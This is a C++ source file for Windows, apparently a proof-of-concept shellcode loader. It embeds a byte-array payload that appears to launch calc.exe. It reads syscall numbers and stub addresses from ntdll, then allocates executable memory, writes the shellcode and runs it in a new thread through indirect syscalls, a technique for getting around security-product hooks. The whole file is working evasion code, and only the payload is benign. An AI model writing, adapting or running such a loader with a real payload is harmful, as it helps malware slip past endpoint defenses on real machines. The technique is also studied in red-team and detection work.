#include <iostream>
#include <Windows.h>
#include "Header.h"
#pragma comment(lib, "ntdll")


int main()
{
    char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    PVOID buffer = NULL;
    SIZE_T buffSize = sizeof(shellcode);

    HMODULE library = LoadLibraryA("ntdll");

    // Address and SSN for NtAllocateVirtualMemory()
    FARPROC addrAVM = GetProcAddress(library, "NtAllocateVirtualMemory");
    DWORD AVMssn = ((unsigned char*)((UINT_PTR)addrAVM + 4))[0];
    UINT_PTR addrAVMsyscall = ((UINT_PTR)addrAVM + 0x12);

    // Address and SSN for NtWriteVirtualMemory()
    FARPROC addrWVM = GetProcAddress(library, "NtWriteVirtualMemory");
    DWORD WVMssn = ((unsigned char*)((UINT_PTR)addrWVM + 4))[0];
    UINT_PTR addrWVMsyscall = ((UINT_PTR)addrWVM + 0x12);

    // Address and SSN for NtCreateThreadEx()
    FARPROC addrCTE = GetProcAddress(library, "NtCreateThreadEx");
    DWORD CTEssn = ((unsigned char*)((UINT_PTR)addrCTE + 4))[0];
    UINT_PTR addrCTEsyscall = ((UINT_PTR)addrCTE + 0x12);

    // Address and SSN for NtWaitForSingleObject()
    FARPROC addrWSO = GetProcAddress(library, "NtWaitForSingleObject");
    DWORD WSOssn = ((unsigned char*)((UINT_PTR)addrWSO + 4))[0];
    UINT_PTR addrWSOsyscall = ((UINT_PTR)addrWSO + 0x12);

    //pass information into the assembly local variables
    passAddrAVM(addrAVMsyscall);
    passAddrWVM(addrWVMsyscall);
    passAddrCTE(addrCTEsyscall);
    passAddrWSO(addrWSOsyscall);

    passNumAVM(AVMssn);
    passNumWVM(WVMssn);
    passNumCTE(CTEssn);
    passNumWSO(WSOssn);

    //execute system call procesures
    std::cout << "[+] Allocating virtual memory within current process...\n";

    sysNtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&buffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); // need to pre-declare a buffer var (different from VirtualAlloc, where it returns an initialized buffer)
    std::cout << "[+] Virtual memory allocated.\n\n[+] Writing shellcode to memory buffer...\n";

    ULONG numBytesWritten;
    sysNtWriteVirtualMemory(GetCurrentProcess(), buffer, shellcode, sizeof(shellcode), &numBytesWritten);
    std::cout << "[+] Shellcode successfully written. Wrote " << numBytesWritten << " bytes.\n\n[+] Creating thread and running memory buffer (stored shellcode)...\n";

    HANDLE hThread;
    sysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0, NULL); //LPTHREAD_START_ROUTINE var will be the memory buffer containing newly-written shellcode (don't confuse with buffer used to store shellcode)
    std::cout << "[+] Check for calc.exe...\n\n";

    sysWaitForSingleObject(hThread, FALSE, NULL);
}